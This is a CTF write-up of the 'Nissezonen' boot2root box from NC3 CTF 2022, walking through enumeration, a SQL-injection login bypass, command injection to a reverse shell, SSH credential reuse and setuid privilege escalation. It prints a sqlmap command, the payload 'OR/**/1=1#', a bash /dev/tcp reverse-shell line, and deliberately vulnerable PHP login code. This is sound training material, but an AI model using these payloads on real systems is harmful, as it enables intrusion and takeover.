---
layout: writeup
title: Nissezonen
ctf: NC3 CTF 2022
points: 200
solves: 3
tags: 
    - boot2root
    - web
    - sqli
    - rev
    - privesc
date: 2022-12-13
description: |-
    Man kan da ikke have en julectf uden en boot2root... Nisserne har hyret en ny udvikler til at sikre deres server for sårbarheder, hack serveren og se om han er sin vægt værd i gløgg.

    Opgaven kan tilgås her: [Nissezonen](https://tryhackme.com/jr/nissezonen). Start derefter maskinen og få tildelt dens IP-adresse.
flag: <br>nc3{1-0_over_nissedev!}<br>nc3{nissedev_er_taget_paa_juleferie}<br>nc3{To_nisser_men_ingen_gloegg}<br>nc3{Velkommen_i_nissezonen!!!}<br>
---
<details>
    <summary>tl;dr</summary>
    Enumerate serveren og find port 80 åben. Enumerate directories og find <code>/login.php</code>.
    Denne har en login form med POST method, der IKKE er vulnerable.
    Gives login details i stedet som GET parametre i URLen, ER der SQL injection, som giver adgang til første flag.<br><br>
    Ved login redirectes til en side med command injection, kørt af user <code>www-data</code>, hvorfra initial access til serveren kan opnås med reverse shell.<br>
    Her findes brugeren <code>nissedev</code> og i filen <code>con.php</code> findes credentials til SQL databasen.
    Samme password giver SSH-adgang til <code>nissedev</code> og andet flag findes.<br><br>
    Filen <code>/usr/bin/nis</code> har setuid capabilities, og reverses med decompiler.
    Køres den som <code>nis whatever NissedevErGenial</code> kører den <code>/home/nissedev/bash</code> som brugeren <code>nisserik</code>, vi dermed kan escalate til og få tredje flag.<br><br>
    Køres filen i stedet som <code>nisserik</code> med <code>nis whatever NissedevErGenial CMD</code>, køres <code>CMD</code> som root, så vi escalater med <code>nis 0 NissedevErGenial bash</code> og får root shell og sidste flag.
</details>

***

***Writeup by N1z0ku and Nissen***

## Enumeration

An nmap scan of the box reveals several open ports:

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.54 ((Debian))
3306/tcp  open  mysql   MySQL (unauthorized)
6379/tcp  open  redis   Redis key-value store 6.0.7
33060/tcp open  mysqlx?
```

The two MySQL services are completely locked down and seem like a waste of time.

The redis service is open and we see it is run from `/home/nissedev`, giving us the user `nissedev`:

![Redis Enumeration]({{ site.baseurl }}/assets/CTFs/2022/NC3-CTF-2022/nissezonen/20221211035729.png)

We also get arbitrary file write through redis, which seems like a probable attack path.

The SSH service was attacked with password enumeration for user `admin` and `nissedev` but with no luck.

Finally, visiting the the web server at port 80, we are presented with a default Apache page.
Enumerating the website directories gives us two interesting files: `/login.php` and `/con.php`, where the latter is empty and likely just contains PHP code for database connection.

### Redis

Although we have arbitrary file upload through redis, it is only to our home folder and some tmp folders. If we had access to `/var/www/html/`, we could potentially have given ourselves a command injection point from the web server, but this was not possible. Also, `nissedev` does not have an `.ssh` folder in their home dir, so we could not generate and upload a new SSH key. We tried also uploading a redis module and running it, but files are uploaded without execution rights, including if they overwrite existing executable files.

Many hours of redis enumeration and attacks led to nothing more than the user `nissedev`.

### Flag 1 - SQLi

The endpoint `/login.php` contains a simple login form:

![Login Page]({{ site.baseurl }}/assets/CTFs/2022/NC3-CTF-2022/nissezonen/20221211033801.png)

Having tried a few attacks, we discovered that certain SQL keywords in the username field results in a slightly shorter response than normally. Inspecting the response, this is due to the final `</body>` and `</html>` tags missing, likely because the PHP code runs `die()` upon SQLi attempts, so there seems to be some WAF on the system. Some keywords we found to have this effect were `SELECT`, `FROM`, `UNION`, `SLEEP`, and then also space and `+`. We spent many hours trying manual attacks and `sqlmap` on the form, but with no luck.

At some point we realised that we could also pass the login parameters through query params using GET. This seemed to be blocked by the same WAF, and we didn't imagine the two methods would be implemented differently. After more time than we care to admit, one of our members had the brilliant idea to fuzz the login via GET anyway, again using `sqlmap`:

```
sqlmap -u "http://<IP>/login.php?Username=a&Password=b" --dbms mysql --tamper versionedmorekeywords --level 5 --risk 3 -v 6
```

This works, and we get a payload to bypass the login. It turns out, just the simplest of bypasses work, e.g. `'OR/**/1=1#` (`/**/` is an empty comment and can be used in place of space):

![SQLi Access]({{ site.baseurl }}/assets/CTFs/2022/NC3-CTF-2022/nissezonen/20221211033602.png)

Lo and behold, a successful SQLi! Apparently the code running in the background is different depending on whether GET or POST is being used.
We are redirected to a long URL with query param `?cli=PING`:

![Logged In]({{ site.baseurl }}/assets/CTFs/2022/NC3-CTF-2022/nissezonen/20221211033717.png)

First flag! Finally!

```
nc3{1-0_over_nissedev!}
```

Note: When we later got server access, we could confirm they were implemented completely differently, see the very last writeup note for the `login.php` code extracted from the server.

---

### Flag 2 - Command Injection

Well, that was easy...

The `cli` param seems to give us command injection on the server, and we see we run as `www-data`:

![id Command Injection]({{ site.baseurl }}/assets/CTFs/2022/NC3-CTF-2022/nissezonen/20221211034826.png)

If we use certain characters like `|` or `&`, we are presented with the error message "kedeligt".
To get shell, we instead spin up a python web server `python3 -m http.server` on our own box,then make a `rev.sh` file locally with a classic `bash -i >& /dev/tcp/<IP>/9001 0>&1` payload in it, `wget` the file via the command injection, then `chmod +x rev.sh` it, and execute it with `bash rev.sh`.

A bit tedious, but we get a shell! Another member on our team got a meterpreter shell running, again sending it over with `wget`, that's another good option.

We now have shell access as user `www-data` and start poking around.
In `/var/www/html/con.php` we find the following database credentials:

![Connection Credentials]({{ site.baseurl }}/assets/CTFs/2022/NC3-CTF-2022/nissezonen/20221211035549.png)

`nissedev` is a lazy dev and have reused those credentials for their SSH access, giving us access to their account and the second flag:

![SSH Access]({{ site.baseurl }}/assets/CTFs/2022/NC3-CTF-2022/nissezonen/20221211040055.png)

```
nc3{nissedev_er_taget_paa_juleferie}
```

---

### Flag 3 & 4 - Setuid File Capabilities

Enumerating the box further, we stumble upon an interesting custom binary at `/usr/bin/nis`.

It has setuid file capabilities, so this is definitely something we should look at!

![Setuid Capabilities]({{ site.baseurl }}/assets/CTFs/2022/NC3-CTF-2022/nissezonen/20221211041256.png)

This means it can run commands as any user, so this binary is very likely the way forward.
We download it to our box and toss it into Ghidra:

![Decompiled Binary]({{ site.baseurl }}/assets/CTFs/2022/NC3-CTF-2022/nissezonen/20221211040632.png)

This first checks if at least two command line arguments have been passed to the binary.
The first one can be anything, but the second must be `NissedevErGenial`. If this is the case, it checks the uid of the current user.
If it is `1001 (nissedev)`, then it sets the uid to `1000 (nisserik)` and runs `/home/nissedev/bash`, giving us shell as user `nisserik`:

![Prives to nisserik]({{ site.baseurl }}/assets/CTFs/2022/NC3-CTF-2022/nissezonen/20221214132950.png)

This gives us access to flag 3:

```
nc3{To_nisser_men_ingen_gloegg}
```

If instead the binary is run as user `nisserik` and three command line arguments has been given, it executes the last of these as `root`. This makes it easy to get root shell:

![Privesc to Root]({{ site.baseurl }}/assets/CTFs/2022/NC3-CTF-2022/nissezonen/20221214132952.png)

Ta-daaa! Now we just gotta grab the final flag, and we are done:

```
nc3{Velkommen_i_nissezonen!!!}
```

## Note

As mentioned, there was only SQLi when using GET. The server code should make it clear why:

```php
include("con.php");

if (isset($_REQUEST["Username"]) && isset($_REQUEST["Password"])) {
    $b = $_REQUEST["Username"];
    $pw = $_REQUEST["Password"];

    // sikkerhedstests
    $test = strtolower($b);

    if (
        strpos($test, 'union') !== false or
        strpos($test, 'select') !== false or
        strpos($test, 'from') !== false or
        strpos($test, 'sleep') !== false or
        strpos($test, ' ') !== false
    ) {
        die("Forkert brugernavn eller kodeord");
    }


    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $ua = strtolower($user_agent);
    if (strpos($ua, 'sqlmap' !== false)) {
        die("Forkert brugernavn eller kodeord");
    }

    // post request
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $user = mysqli_real_escape_string($con, $b);

        $salt = '398c4c3c72ad2747fd804e87';
        $pass = hash('sha256', $salt . $_REQUEST["Password"]);

        $stmt = $con->prepare( "SELECT brugernavn FROM adgang WHERE (brugernavn=? || password=?)");
        $stmt->bind_param('ss', $user, $pass);
        $stmt->execute();
        $stmt->bind_result($UserName);
        $rs= $stmt->fetch();
        $stmt->close();
        
        if (!$rs) {
            echo("Forkert brugernavn eller kodeord");
        } else {
            echo "<p>Du er logged ind</p>". $UserName;
            $_SESSION['id']='7ffd4e749806cc5877d48e3e048bccccfffab7962d112ab4bf789ed63a59d4a3';
            header("location: /8a0fe01bdd76254ecb1f7937b1051f3769e1a8c49ba53d4a82d8f3413b74e05b/c.php?cli=PING");
        }
    }


    // get request
    if ($_SERVER["REQUEST_METHOD"] == "GET") {
        $salt = '398c4c3c72ad2747fd804e87';
        $pass = hash('sha256', $salt . $_REQUEST["Password"]);

        $sql = "SELECT * FROM adgang WHERE brugernavn = '$b' and password = '$pass'";
        $result = mysqli_query($con, $sql);
        $row = mysqli_fetch_array($result);

        $count = mysqli_num_rows($result);

        if ($count == 1) {
            echo "<p>Du er logged ind</p>";
            $_SESSION['id']='7ffd4e749806cc5877d48e3e048bccccfffab7962d112ab4bf789ed63a59d4a3';
            header("location: /8a0fe01bdd76254ecb1f7937b1051f3769e1a8c49ba53d4a82d8f3413b74e05b/c.php?cli=PING");
        } else {
            echo "Forkert brugernavn eller kodeord";
        }
    }
}
```

This first does a very basic check for a few SQL keywords and dies if found. In addition, they added a check for whether the user agent contains `'sqlmap'`. Notice, however, that the end parenthesis is wrongly placed, so this filter does nothing and the check does not work - luckily for us. Otherwise, the `sqlmap` flag `--random-agent` should do the trick.

Most importantly, there is two completely different handlers implemented for `GET` and `POST`, and the `POST` handler seems correctly implemented. The `GET` handler has a clear SQLi vulnerability in the username field, as this is injected directly into the query string. This goes for the password field too, but that is hashed before insertion, so that is not vulnerable.


***Writeup by N1z0ku and Nissen***